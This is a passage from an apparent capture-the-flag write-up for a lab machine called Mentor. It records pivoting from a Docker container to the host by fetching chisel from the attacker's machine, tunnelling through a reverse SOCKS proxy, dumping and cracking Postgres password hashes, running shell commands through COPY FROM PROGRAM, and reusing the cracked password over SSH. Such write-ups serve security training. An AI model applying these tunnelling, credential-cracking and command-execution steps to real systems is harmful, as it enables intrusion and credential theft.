from<span class="w"> </span>sqlalchemy.sql<span class="w"> </span>import<span class="w"> </span>func
from<span class="w"> </span>databases<span class="w"> </span>import<span class="w"> </span>Database

<span class="c1"># Database url if none is passed the default one is used</span>
<span class="nv">DATABASE_URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>os.getenv<span class="o">(</span><span class="s2">&quot;DATABASE_URL&quot;</span>,<span class="w"> </span><span class="s2">&quot;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&quot;</span><span class="o">)</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/app/app<span class="w"> </span><span class="c1"># ip r</span>
default<span class="w"> </span>via<span class="w"> </span><span class="m">172</span>.22.0.1<span class="w"> </span>dev<span class="w"> </span>eth0
<span class="m">172</span>.22.0.0/16<span class="w"> </span>dev<span class="w"> </span>eth0<span class="w"> </span>scope<span class="w"> </span>link<span class="w">  </span>src<span class="w"> </span><span class="m">172</span>.22.0.3
</pre></div>
</div>
<p>So we of course don’t have psql here in the container, but the container’s file system isn’t read only, so we should be able download something like chisel in there and smuggle traffic from our own box into the postgres instance on the host, through the container.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/app<span class="w"> </span><span class="c1"># nc -vz 172.22.0.1 5432</span>
<span class="w">       </span>nc<span class="w"> </span>-vz<span class="w"> </span><span class="m">172</span>.22.0.1<span class="w"> </span><span class="m">5432</span>
<span class="m">172</span>.22.0.1<span class="w"> </span><span class="o">(</span><span class="m">172</span>.22.0.1:5432<span class="o">)</span><span class="w"> </span>open
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/app/app<span class="w"> </span><span class="c1"># which psql</span>
/app/app<span class="w"> </span><span class="c1"># touch file</span>
/app/app<span class="w"> </span><span class="c1"># which ssh</span>
/app/app<span class="w"> </span><span class="c1">#</span>
/dev/shm<span class="w"> </span><span class="c1"># wget --no-check-certificate https://10.10.14.134:9090/chisel_1.7.7_linux_amd64</span>
</pre></div>
</div>
<p>I’m experimenting with chisel on my own network first, trying to make sense of the socks5 reverse proxying… this works:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>attacker<span class="w"> </span><span class="c1"># ./chisel server -p 4242 --socks5 --reverse</span>
victim<span class="w">   </span><span class="c1"># ./chisel client 192.168.0.73:4242 R:1080:socks</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>victim<span class="w">   </span><span class="c1"># updog --port 4040</span>
attacker<span class="w"> </span><span class="c1"># curl -x socks5://localhost:1080 http://127.0.0.1:4040 </span>
attacker<span class="w"> </span><span class="c1"># proxychains curl http://127.0.0.1:4040 </span>
</pre></div>
</div>
<p>lets try to do that on the machine now.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>./chisel-arm<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">4242</span><span class="w"> </span>--socks5<span class="w"> </span>--reverse
/app<span class="w"> </span><span class="c1"># ./chisel-amd client 10.10.14.130:4242 R:1080:socks</span>
</pre></div>
</div>
<p>Looks like the client connection came through, so I should be able to use proxychains to talk to the postgress server now</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>nc<span class="w"> </span>-vz<span class="w"> </span><span class="m">172</span>.22.0.1<span class="w"> </span><span class="m">5432</span>
<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>config<span class="w"> </span>file<span class="w"> </span>found:<span class="w"> </span>/etc/proxychains4.conf
<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>preloading<span class="w"> </span>/usr/lib/aarch64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>DLL<span class="w"> </span>init:<span class="w"> </span>proxychains-ng<span class="w"> </span><span class="m">4</span>.16
<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>Strict<span class="w"> </span>chain<span class="w">  </span>...<span class="w">  </span><span class="m">127</span>.0.0.1:1080<span class="w">  </span>...<span class="w">  </span><span class="m">172</span>.22.0.1:5432<span class="w">  </span>...<span class="w">  </span>OK
<span class="m">172</span>.22.0.1<span class="w"> </span><span class="o">[</span><span class="m">172</span>.22.0.1<span class="o">]</span><span class="w"> </span><span class="m">5432</span><span class="w"> </span><span class="o">(</span>postgresql<span class="o">)</span><span class="w"> </span>open<span class="w"> </span>:<span class="w"> </span>Operation<span class="w"> </span>now<span class="w"> </span><span class="k">in</span><span class="w"> </span>progress
</pre></div>
</div>
<p>Nice, lets connect to it</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>-q<span class="w"> </span>psql<span class="w"> </span>-U<span class="w"> </span>postgres<span class="w"> </span>-W<span class="w"> </span>postgres<span class="w"> </span>--host<span class="w"> </span><span class="m">172</span>.22.0.1
Password:
psql<span class="w"> </span><span class="o">(</span><span class="m">15</span>.2<span class="w"> </span><span class="o">(</span>Debian<span class="w"> </span><span class="m">15</span>.2-1<span class="o">)</span>,<span class="w"> </span>server<span class="w"> </span><span class="m">13</span>.7<span class="w"> </span><span class="o">(</span>Debian<span class="w"> </span><span class="m">13</span>.7-1.pgdg110+1<span class="o">))</span>
Type<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>help.
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">postgres</span><span class="o">=</span><span class="c1"># \setenv PAGER &#39;less -S&#39;</span>
<span class="n">postgres</span><span class="o">=</span><span class="c1"># \l</span>
                                                   <span class="n">List</span> <span class="n">of</span> <span class="n">databases</span>
      <span class="n">Name</span>       <span class="o">|</span>  <span class="n">Owner</span>   <span class="o">|</span> <span class="n">Encoding</span> <span class="o">|</span>  <span class="n">Collate</span>   <span class="o">|</span>   <span class="n">Ctype</span>    <span class="o">|</span> <span class="n">ICU</span> <span class="n">Locale</span> <span class="o">|</span> <span class="n">Locale</span> <span class="n">Provider</span> <span class="o">|</span>   <span class="n">Access</span> <span class="n">privileges</span>
<span class="o">-----------------+----------+----------+------------+------------+------------+-----------------+-----------------------</span>
 <span class="n">mentorquotes_db</span> <span class="o">|</span> <span class="n">postgres</span> <span class="o">|</span> <span class="n">UTF8</span>     <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span>            <span class="o">|</span> <span class="n">libc</span>            <span class="o">|</span>
 <span class="n">postgres</span>        <span class="o">|</span> <span class="n">postgres</span> <span class="o">|</span> <span class="n">UTF8</span>     <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span>            <span class="o">|</span> <span class="n">libc</span>            <span class="o">|</span>
 <span class="n">template0</span>       <span class="o">|</span> <span class="n">postgres</span> <span class="o">|</span> <span class="n">UTF8</span>     <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span>            <span class="o">|</span> <span class="n">libc</span>            <span class="o">|</span> <span class="o">=</span><span class="n">c</span><span class="o">/</span><span class="n">postgres</span>          <span class="o">+</span>
                 <span class="o">|</span>          <span class="o">|</span>          <span class="o">|</span>            <span class="o">|</span>            <span class="o">|</span>            <span class="o">|</span>                 <span class="o">|</span> <span class="n">postgres</span><span class="o">=</span><span class="n">CTc</span><span class="o">/</span><span class="n">postgres</span>
 <span class="n">template1</span>       <span class="o">|</span> <span class="n">postgres</span> <span class="o">|</span> <span class="n">UTF8</span>     <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span> <span class="n">en_US</span><span class="o">.</span><span class="n">utf8</span> <span class="o">|</span>            <span class="o">|</span> <span class="n">libc</span>            <span class="o">|</span> <span class="o">=</span><span class="n">c</span><span class="o">/</span><span class="n">postgres</span>          <span class="o">+</span>
                 <span class="o">|</span>          <span class="o">|</span>          <span class="o">|</span>            <span class="o">|</span>            <span class="o">|</span>            <span class="o">|</span>                 <span class="o">|</span> <span class="n">postgres</span><span class="o">=</span><span class="n">CTc</span><span class="o">/</span><span class="n">postgres</span>
<span class="p">(</span><span class="mi">4</span> <span class="n">rows</span><span class="p">)</span>

</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>-q<span class="w"> </span>psql<span class="w"> </span>-U<span class="w"> </span>postgres<span class="w"> </span>-W<span class="w"> </span>postgres<span class="w"> </span>--host<span class="w"> </span><span class="m">172</span>.22.0.1<span class="w"> </span>-d<span class="w"> </span>mentorquotes_db
psql:<span class="w"> </span>warning:<span class="w"> </span>extra<span class="w"> </span>command-line<span class="w"> </span>argument<span class="w"> </span><span class="s2">&quot;postgres&quot;</span><span class="w"> </span>ignored
Password:
psql<span class="w"> </span><span class="o">(</span><span class="m">15</span>.2<span class="w"> </span><span class="o">(</span>Debian<span class="w"> </span><span class="m">15</span>.2-1<span class="o">)</span>,<span class="w"> </span>server<span class="w"> </span><span class="m">13</span>.7<span class="w"> </span><span class="o">(</span>Debian<span class="w"> </span><span class="m">13</span>.7-1.pgdg110+1<span class="o">))</span>
Type<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>help.
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mentorquotes_db</span><span class="o">=</span><span class="c1"># \dt</span>

          <span class="n">List</span> <span class="n">of</span> <span class="n">relations</span>
 <span class="n">Schema</span> <span class="o">|</span>   <span class="n">Name</span>   <span class="o">|</span> <span class="n">Type</span>  <span class="o">|</span>  <span class="n">Owner</span>
<span class="o">--------+----------+-------+----------</span>
 <span class="n">public</span> <span class="o">|</span> <span class="n">cmd_exec</span> <span class="o">|</span> <span class="n">table</span> <span class="o">|</span> <span class="n">postgres</span>
 <span class="n">public</span> <span class="o">|</span> <span class="n">quotes</span>   <span class="o">|</span> <span class="n">table</span> <span class="o">|</span> <span class="n">postgres</span>
 <span class="n">public</span> <span class="o">|</span> <span class="n">users</span>    <span class="o">|</span> <span class="n">table</span> <span class="o">|</span> <span class="n">postgres</span>
<span class="p">(</span><span class="mi">3</span> <span class="n">rows</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">mentorquotes_db</span><span class="o">=#</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
<span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w">         </span><span class="n">email</span><span class="w">          </span><span class="o">|</span><span class="w">  </span><span class="n">username</span><span class="w">   </span><span class="o">|</span><span class="w">             </span><span class="n">password</span>
<span class="c1">----+------------------------+-------------+----------------------------------</span>
<span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">james</span><span class="o">@</span><span class="n">mentorquotes</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">james</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="mi">7</span><span class="n">ccdcd8c05b59add9c198d492b36a503</span>
<span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">svc</span><span class="o">@</span><span class="n">mentorquotes</span><span class="p">.</span><span class="n">htb</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">service_acc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">53</span><span class="n">f22d0dfa10dce7e29cd31f4f953fd8</span>
<span class="p">(</span><span class="mi">2</span><span class="w"> </span><span class="k">rows</span><span class="p">)</span>
</pre></div>
</div>
<p>We already have james’s password but we can try to feed the service account’s hash into crackstation real quick, and we get a match</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">service_acc</span><span class="p">:</span><span class="mi">123</span><span class="n">meunomeeivani</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span>123meunomeeivani<span class="p">|</span>md5sum
53f22d0dfa10dce7e29cd31f4f953fd8<span class="w">  </span>-
<span class="nb">printf</span><span class="w"> </span>kj23sadkj123as0-d213<span class="p">|</span>md5sum
7ccdcd8c05b59add9c198d492b36a503<span class="w">  </span>-
</pre></div>
</div>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w">                 </span><span class="n">title</span><span class="w">                 </span><span class="o">|</span><span class="w">                                                                                                                                                                   </span><span class="o">&gt;</span>
<span class="c1">----+---------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------&gt;</span>
<span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">I</span><span class="w"> </span><span class="n">believed</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">good</span><span class="w">                </span><span class="o">|</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">bad</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">studies</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">school</span><span class="p">.</span><span class="w"> </span><span class="n">Teachers</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">tell</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">different</span><span class="w"> </span><span class="n">passion</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="k">than</span><span class="w"> </span><span class="n">typical</span><span class="w"> </span><span class="n">education</span><span class="p">.</span><span class="w"> </span><span class="n">Nonetheless</span><span class="p">,</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">got</span><span class="w"> </span><span class="n">rid</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">n</span><span class="o">&gt;</span>
<span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Find</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">passion</span><span class="w"> </span><span class="k">before</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">too</span><span class="w"> </span><span class="n">late</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">When</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">growing</span><span class="w"> </span><span class="n">up</span><span class="p">,</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">really</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">much</span><span class="p">,</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">enjoyed</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">passion</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">take</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">seriously</span><span class="p">.</span><span class="w"> </span><span class="k">When</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">worked</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">gas</span><span class="w"> </span><span class="n">station</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">years</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">poi</span><span class="o">&gt;</span>
<span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Never</span><span class="w"> </span><span class="n">too</span><span class="w"> </span><span class="n">late</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">construction</span><span class="w"> </span><span class="n">worker</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">almost</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">years</span><span class="p">.</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">had</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">work</span><span class="w"> </span><span class="n">there</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">educational</span><span class="w"> </span><span class="n">background</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">work</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">academic</span><span class="w"> </span><span class="n">sector</span><span class="p">.</span><span class="w"> </span><span class="n">But</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">reali</span><span class="o">&gt;</span>
<span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Age</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">just</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nb">number</span><span class="w">                  </span><span class="o">|</span><span class="w"> </span><span class="k">When</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">kid</span><span class="p">,</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">create</span><span class="w"> </span><span class="n">very</span><span class="w"> </span><span class="k">simple</span><span class="w"> </span><span class="n">video</span><span class="w"> </span><span class="n">games</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">hobby</span><span class="p">.</span><span class="w"> </span><span class="n">Because</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">loved</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">much</span><span class="p">,</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">thought</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">myself</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">am</span><span class="w"> </span><span class="n">going</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">game</span><span class="w"> </span><span class="n">developer</span><span class="w"> </span><span class="n">so</span><span class="o">&gt;</span>
<span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Its</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="n">worth</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">end</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">Working</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">school</span><span class="w"> </span><span class="n">teacher</span><span class="p">,</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">had</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">lot</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">responsibilities</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">fulfill</span><span class="p">.</span><span class="w"> </span><span class="n">Even</span><span class="w"> </span><span class="n">though</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">really</span><span class="w"> </span><span class="n">loved</span><span class="w"> </span><span class="n">teaching</span><span class="w"> </span><span class="n">kids</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">pressure</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">unbearable</span><span class="p">.</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">had</span><span class="w"> </span><span class="mi">10</span><span class="o">-</span><span class="n">hour</span><span class="w"> </span><span class="n">shif</span><span class="o">&gt;</span>
<span class="p">(</span><span class="mi">5</span><span class="w"> </span><span class="k">rows</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">mentorquotes_db</span><span class="o">=#</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">;</span>
<span class="w">                               </span><span class="n">cmd_output</span>
<span class="c1">------------------------------------------------------------------------</span>
<span class="w"> </span><span class="n">uid</span><span class="o">=</span><span class="mi">999</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">999</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">999</span><span class="p">(</span><span class="n">postgres</span><span class="p">),</span><span class="mi">101</span><span class="p">(</span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">)</span>
<span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="p">)</span>
</pre></div>
</div>
<p>Here’s another cool trick on postgress from the ippsec video</p>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">DROP</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">;</span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
<span class="k">COPY</span><span class="w"> </span><span class="n">cmd_exec</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="s1">&#39;ls -la&#39;</span><span class="p">;</span>
<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">;</span>
<span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">cmd_exec</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">cmd_output</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">;</span>
<span class="n">OP</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">;</span>
</pre></div>
</div>
<p>This works because we’re unning as superuser, in our case that would give us exec on the postgres container. but if the DB was on the host. that could have been interesting</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>\<span class="n">du</span>
                                   <span class="n">List</span> <span class="n">of</span> <span class="n">roles</span>
 <span class="n">Role</span> <span class="n">name</span> <span class="o">|</span>                         <span class="n">Attributes</span>                         <span class="o">|</span> <span class="n">Member</span> <span class="n">of</span>
<span class="o">-----------+------------------------------------------------------------+-----------</span>
 <span class="n">postgres</span>  <span class="o">|</span> <span class="n">Superuser</span><span class="p">,</span> <span class="n">Create</span> <span class="n">role</span><span class="p">,</span> <span class="n">Create</span> <span class="n">DB</span><span class="p">,</span> <span class="n">Replication</span><span class="p">,</span> <span class="n">Bypass</span> <span class="n">RLS</span> <span class="o">|</span> <span class="p">{}</span>
</pre></div>
</div>
<p>Using the socks proxy to scan the environment</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>-q<span class="w"> </span>nmap<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.alpine
PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
<span class="m">8000</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-alt
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>-q<span class="w"> </span>nmap<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span><span class="m">172</span>.22.0.1<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.alpine-host
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-03-12<span class="w"> </span><span class="m">10</span>:21<span class="w"> </span>GMT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">172</span>.22.0.1
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.100s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">995</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh
<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http
<span class="m">81</span>/tcp<span class="w">   </span>open<span class="w">  </span>hosts2-ns
<span class="m">5432</span>/tcp<span class="w"> </span>open<span class="w">  </span>postgresql
<span class="m">8000</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-alt

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">102</span>.62<span class="w"> </span>seconds
</pre></div>
</div>
<p>The password we got from <code class="docutils literal notranslate"><span class="pre">svc_acc</span></code> works with the <code class="docutils literal notranslate"><span class="pre">svc</span></code> user over ssh</p>
<p>We’re now the svc user on the actual host, and as we knew already, it’s running docker, but our user doesn’t have access:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@mentor:~$<span class="w"> </span>netstat<span class="w"> </span>-tulpen
<span class="o">(</span>Not<span class="w"> </span>all<span class="w"> </span>processes<span class="w"> </span>could<span class="w"> </span>be<span class="w"> </span>identified,<span class="w"> </span>non-owned<span class="w"> </span>process<span class="w"> </span>info
<span class="w"> </span>will<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>shown,<span class="w"> </span>you<span class="w"> </span>would<span class="w"> </span>have<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>root<span class="w"> </span>to<span class="w"> </span>see<span class="w"> </span>it<span class="w"> </span>all.<span class="o">)</span>
Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>only<span class="w"> </span>servers<span class="o">)</span>
Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">       </span>User<span class="w">       </span>Inode<span class="w">      </span>PID/Program<span class="w"> </span>name
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">102</span><span class="w">        </span><span class="m">29979</span><span class="w">      </span>-
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">172</span>.22.0.1:81<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">36638</span><span class="w">      </span>-
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">172</span>.22.0.1:5432<span class="w">         </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">34661</span><span class="w">      </span>-
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:22<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">32752</span><span class="w">      </span>-
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:42789<span class="w">         </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">33910</span><span class="w">      </span>-
